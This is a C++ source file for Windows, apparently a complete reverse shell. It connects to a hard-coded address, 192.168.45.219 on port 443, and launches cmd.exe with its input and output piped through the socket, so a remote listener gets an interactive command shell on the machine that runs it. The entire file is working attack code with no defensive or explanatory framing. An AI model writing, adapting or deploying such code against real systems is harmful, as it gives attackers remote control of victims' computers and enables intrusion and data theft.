#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <thread>  // For multi-threading support
#include <atomic>  // For atomic flags
#include <chrono>  // For time management

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024

// Static IP and port values
const std::string SERVER_IP = "192.168.45.219";  // Replace with the desired static IP
const int SERVER_PORT = 443;                    // Replace with the desired static port

int InitializeWinsock() {
    WSADATA wsData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return -1;
    }
    return 0;
}

SOCKET CreateSocket() {
    SOCKET clientSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket: " << WSAGetLastError() << std::endl;
        return INVALID_SOCKET;
    }
    return clientSocket;
}

bool ConnectToServer(SOCKET clientSocket) {
    sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP.c_str(), &serverAddr.sin_addr) <= 0) {
        std::cerr << "Invalid IP address." << std::endl;
        return false;
    }

    if (WSAConnect(clientSocket, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr), nullptr, nullptr, nullptr, nullptr) == SOCKET_ERROR) {
        std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    return true;
}

void SetupRedirection(SOCKET clientSocket) {
    STARTUPINFO si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = reinterpret_cast<HANDLE>(clientSocket);
    si.hStdOutput = reinterpret_cast<HANDLE>(clientSocket);
    si.hStdError = reinterpret_cast<HANDLE>(clientSocket);

    PROCESS_INFORMATION pi = {};

    std::wstring cmd = L"cmd.exe";

    if (!CreateProcess(
        nullptr,
        const_cast<LPWSTR>(cmd.c_str()),
        nullptr,
        nullptr,
        TRUE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi)) {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);  // Keep the shell open

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void ReverseShell() {
    SOCKET clientSocket = CreateSocket();
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    std::cout << "Attempting to connect to the server..." << std::endl;
    if (!ConnectToServer(clientSocket)) {
        std::cerr << "Failed to connect to the server!" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    std::cout << "Connection established. Starting reverse shell..." << std::endl;
    SetupRedirection(clientSocket);

    closesocket(clientSocket);  // Clean up after the shell exits
    WSACleanup();               // Cleanup Winsock
}

int main() {
    if (InitializeWinsock() != 0) {
        return -1;
    }

    // Launch reverse shell in a new thread to make it independent
    std::thread reverseShellThread(ReverseShell);

    // Wait for the reverse shell thread to complete to ensure it's working
    reverseShellThread.join();

    std::cout << "Reverse shell has completed." << std::endl;

    return 0;
}
